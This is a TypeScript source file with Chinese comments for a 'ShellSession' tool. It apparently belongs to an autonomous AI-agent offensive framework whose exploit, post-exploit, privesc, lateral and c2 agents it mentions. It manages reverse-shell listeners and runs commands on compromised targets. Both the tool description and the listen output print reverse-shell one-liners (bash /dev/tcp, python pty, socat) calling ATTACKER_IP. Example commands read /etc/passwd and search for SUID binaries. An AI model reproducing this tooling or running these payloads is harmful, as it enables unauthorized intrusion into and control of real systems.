/**
 * ShellSession — 反弹 shell 会话管理工具
 *
 * 解决"拿到反弹 shell 后无法持续交互"的问题。
 * 传统 nc -lvnp 只能捕获输出，无法发送命令。
 * ShellSession 维护持久 TCP 连接，支持多次 exec。
 *
 * 典型流程：
 *   1. ShellSession({ action: "listen", port: 4444 })
 *   2. 触发目标 RCE，让目标反弹到 ATTACKER_IP:4444
 *   3. ShellSession({ action: "exec", session_id: "shell_4444", command: "id" })
 *   4. 重复步骤 3 执行任意命令
 *
 * 会话在进程内持久保存（module-level Map），exploit agent 建立的连接
 * 对 post-exploit / privesc agent 同样可见。
 */

import * as net from 'net'
import * as fs from 'fs'
import * as path from 'path'
import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'

interface ShellConn {
  id:           string
  port:         number
  server:       net.Server
  socket:       net.Socket | null
  connectedAt:  Date | null
  logFile:      string
  logStream:    fs.WriteStream | null
}

/** Module-level session registry — persists across agent calls in the same process */
const _sessions = new Map<string, ShellConn>()

function sessionId(port: number): string {
  return `shell_${port}`
}

function resolveId(input: Record<string, unknown>): string {
  if (input.session_id) return String(input.session_id)
  if (input.port) return sessionId(Number(input.port))
  return 'shell_4444'
}

/** Strip common shell prompts from the end of output */
function stripPrompt(s: string): string {
  // Remove trailing prompts like "root@host:~# ", "$ ", "> ", etc.
  return s.replace(/\n?[^\n]*[#$>]\s*$/, '').trimEnd()
}

/** Strip echoed command from the beginning of output (raw PTY echo) */
function stripEcho(output: string, command: string): string {
  const trimmed = output.trimStart()
  if (trimmed.startsWith(command)) {
    return trimmed.slice(command.length).replace(/^\r?\n/, '')
  }
  return output
}

export class ShellSessionTool implements Tool {
  name = 'ShellSession'

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'ShellSession',
      description: `管理反弹 shell 会话。提供持久化 TCP 监听器和交互式命令执行，替代一次性 nc 监听。

## 操作类型

| action | 用途 |
|--------|------|
| listen | 在指定端口启动 TCP 监听器，等待反弹 shell 连入 |
| exec   | 向已建立的 shell 发送命令并获取输出（可多次调用） |
| list   | 列出所有活跃会话及状态 |
| kill   | 关闭指定会话 |

## 典型工作流

### 步骤 1：启动监听
ShellSession({ action: "listen", port: 4444 })
→ 返回 session_id 和触发反弹 shell 的命令示例

### 步骤 2：触发反弹（通过 RCE/WebShell）
用 Bash / WebShell 在目标上执行：
  bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
  python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

### 步骤 3：确认连接后执行命令
ShellSession({ action: "exec", session_id: "shell_4444", command: "id && whoami && hostname" })
ShellSession({ action: "exec", session_id: "shell_4444", command: "cat /etc/passwd" })
ShellSession({ action: "exec", session_id: "shell_4444", command: "find / -perm -4000 -type f 2>/dev/null" })

## 注意
- 会话在进程内持久保存，exploit agent 建立的连接 post-exploit agent 同样可见
- 所有输出同时写入日志文件（路径在 listen 响应中给出）
- 对于耗时命令（如大范围 find），适当增大 timeout`,
      parameters: {
        type: 'object',
        properties: {
          action: {
            type: 'string',
            enum: ['listen', 'exec', 'list', 'kill'],
            description: '操作类型',
          },
          port: {
            type: 'number',
            description: '监听端口（listen 时必填；exec/kill 时若省略 session_id 则用此字段）',
          },
          session_id: {
            type: 'string',
            description: 'Shell 会话 ID（格式 shell_PORT，如 shell_4444）。exec/kill 时必填（或提供 port）',
          },
          command: {
            type: 'string',
            description: '要在目标 shell 上执行的命令（exec 时必填）',
          },
          timeout: {
            type: 'number',
            description: '等待输出的最长毫秒数（默认 8000）。对于耗时命令（find/grep 大目录）设大一些，如 30000',
          },
          log_dir: {
            type: 'string',
            description: 'Shell 交互日志写入目录（listen 时可选，默认 /tmp）',
          },
        },
        required: ['action'],
      },
    },
  }

  async execute(input: Record<string, unknown>, _context: ToolContext): Promise<ToolResult> {
    switch (String(input.action)) {
      case 'listen': return this._listen(input)
      case 'exec':   return this._exec(input)
      case 'list':   return this._list()
      case 'kill':   return this._kill(input)
      default:
        return { content: `Unknown action "${input.action}". Use: listen | exec | list | kill`, isError: true }
    }
  }

  // ── listen ────────────────────────────────────────────────────────────────

  private _listen(input: Record<string, unknown>): Promise<ToolResult> {
    const port   = Number(input.port ?? 4444)
    const id     = sessionId(port)
    const logDir = String(input.log_dir ?? '/tmp')

    if (_sessions.has(id)) {
      const s = _sessions.get(id)!
      const state = s.socket ? 'CONNECTED' : 'LISTENING'
      return Promise.resolve({
        content: `Session "${id}" already exists (${state}). Use exec to send commands.`,
        isError: false,
      })
    }

    return new Promise((resolve) => {
      try { fs.mkdirSync(logDir, { recursive: true }) } catch { /* ignore */ }

      const logFile   = path.join(logDir, `${id}.log`)
      const logStream = fs.createWriteStream(logFile, { flags: 'a' })

      const server = net.createServer((socket) => {
        const conn = _sessions.get(id)!
        conn.socket      = socket
        conn.connectedAt = new Date()

        const peer = `${socket.remoteAddress}:${socket.remotePort}`
        const connMsg = `\n[+] Shell connected from ${peer} at ${conn.connectedAt.toISOString()}\n`
        logStream.write(connMsg)

        socket.on('data', (chunk) => {
          logStream.write(chunk)
        })

        socket.on('close', () => {
          conn.socket      = null
          conn.connectedAt = null
          logStream.write('\n[-] Shell disconnected\n')
        })

        socket.on('error', (err) => {
          conn.socket = null
          logStream.write(`\n[!] Socket error: ${err.message}\n`)
        })
      })

      server.on('error', (err) => {
        _sessions.delete(id)
        logStream.end()
        resolve({ content: `Failed to listen on port ${port}: ${err.message}`, isError: true })
      })

      server.listen(port, '0.0.0.0', () => {
        _sessions.set(id, { id, port, server, socket: null, connectedAt: null, logFile, logStream })

        resolve({
          content: [
            `[ShellSession] Listening on 0.0.0.0:${port}  (session: ${id})`,
            `Log file: ${logFile}`,
            ``,
            `Now trigger the reverse shell on target (pick one):`,
            `  bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/${port} 0>&1'`,
            `  python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`,
            `  socat tcp:ATTACKER_IP:${port} exec:/bin/bash,pty,stderr,setsid,sigint,sane`,
            ``,
            `After target connects, run:`,
            `  ShellSession({ action: "exec", session_id: "${id}", command: "id" })`,
          ].join('\n'),
          isError: false,
        })
      })
    })
  }

  // ── exec ──────────────────────────────────────────────────────────────────

  private _exec(input: Record<string, unknown>): Promise<ToolResult> {
    const id      = resolveId(input)
    const command = String(input.command ?? '').trim()
    const timeout = Number(input.timeout ?? 8_000)

    if (!command) {
      return Promise.resolve({ content: 'Error: command is required for exec', isError: true })
    }

    const conn = _sessions.get(id)
    if (!conn) {
      const avail = [..._sessions.keys()].join(', ') || 'none'
      return Promise.resolve({
        content: `Session "${id}" not found. Active sessions: ${avail}.\nStart with: ShellSession({ action: "listen", port: 4444 })`,
        isError: true,
      })
    }

    if (!conn.socket) {
      return Promise.resolve({
        content: [
          `Session "${id}" is listening on port ${conn.port} but no shell has connected yet.`,
          `Trigger reverse shell on target first, then retry exec.`,
          `Current log: ${conn.logFile}`,
        ].join('\n'),
        isError: false,
      })
    }

    return new Promise((resolve) => {
      const socket  = conn.socket!
      const chunks: Buffer[] = []
      let done      = false
      let stabilize: ReturnType<typeof setTimeout> | null = null
      let firstByte: ReturnType<typeof setTimeout> | null = null

      const finish = () => {
        if (done) return
        done = true
        if (stabilize) clearTimeout(stabilize)
        if (firstByte) clearTimeout(firstByte)
        socket.removeListener('data', onData)

        let output = Buffer.concat(chunks).toString('utf8')
        output = stripEcho(output, command)
        output = stripPrompt(output)

        resolve({ content: output.trimEnd() || '(empty output)', isError: false })
      }

      const onData = (chunk: Buffer) => {
        chunks.push(chunk)
        if (firstByte) { clearTimeout(firstByte); firstByte = null }
        // Reset stabilize timer — 400ms silence after last byte means done
        if (stabilize) clearTimeout(stabilize)
        stabilize = setTimeout(finish, 400)
      }

      socket.on('data', onData)

      // Hard timeout — give up if zero output in `timeout` ms
      firstByte = setTimeout(finish, timeout)

      socket.write(command + '\n', (err) => {
        if (err) {
          done = true
          socket.removeListener('data', onData)
          resolve({ content: `Write failed: ${err.message}`, isError: true })
        }
      })
    })
  }

  // ── list ──────────────────────────────────────────────────────────────────

  private _list(): ToolResult {
    if (_sessions.size === 0) {
      return { content: 'No active ShellSession sessions. Use: ShellSession({ action: "listen", port: 4444 })', isError: false }
    }

    const lines = ['Active ShellSession sessions:']
    for (const [, s] of _sessions) {
      const state = s.socket
        ? `CONNECTED (from ${s.socket.remoteAddress}, since ${s.connectedAt?.toISOString()})`
        : `LISTENING on port ${s.port} (waiting for connection)`
      lines.push(`  ${s.id}  —  ${state}`)
      lines.push(`             log: ${s.logFile}`)
    }
    return { content: lines.join('\n'), isError: false }
  }

  // ── kill ──────────────────────────────────────────────────────────────────

  private _kill(input: Record<string, unknown>): ToolResult {
    const id   = resolveId(input)
    const conn = _sessions.get(id)
    if (!conn) {
      return { content: `Session "${id}" not found.`, isError: true }
    }

    conn.socket?.destroy()
    conn.server.close()
    conn.logStream?.end()
    _sessions.delete(id)

    return { content: `Session "${id}" closed.`, isError: false }
  }
}

// ── Programmatic helper ───────────────────────────────────────────────────────

/**
 * Execute a command on an active shell session.
 * Used by agent modules (lateral, c2, report, privesc) to run commands on
 * established reverse shells without going through the LLM tool loop.
 */
export async function executeCommand(
  shellId: string,
  command: string,
  opts: { timeout?: number } = {},
): Promise<{ output: string; success: boolean; exitCode: number }> {
  const conn = _sessions.get(shellId)
  if (!conn) {
    return { output: `Session "${shellId}" not found`, success: false, exitCode: 1 }
  }
  if (!conn.socket) {
    return { output: `Session "${shellId}" has no active connection`, success: false, exitCode: 1 }
  }

  const timeout = opts.timeout ?? 8_000

  return new Promise((resolve) => {
    const socket = conn.socket!
    const chunks: Buffer[] = []
    let done = false
    let stabilize: ReturnType<typeof setTimeout> | null = null
    let firstByte: ReturnType<typeof setTimeout> | null = null

    const finish = () => {
      if (done) return
      done = true
      if (stabilize) clearTimeout(stabilize)
      if (firstByte) clearTimeout(firstByte)
      socket.removeListener('data', onData)

      let output = Buffer.concat(chunks).toString('utf8')
      output = stripEcho(output, command)
      output = stripPrompt(output)

      resolve({ output: output.trimEnd(), success: true, exitCode: 0 })
    }

    const onData = (chunk: Buffer) => {
      chunks.push(chunk)
      if (firstByte) { clearTimeout(firstByte); firstByte = null }
      if (stabilize) clearTimeout(stabilize)
      stabilize = setTimeout(finish, 400)
    }

    socket.on('data', onData)
    firstByte = setTimeout(finish, timeout)

    socket.write(command + '\n', (err) => {
      if (err) {
        done = true
        socket.removeListener('data', onData)
        resolve({ output: `Write failed: ${err.message}`, success: false, exitCode: 1 })
      }
    })
  })
}
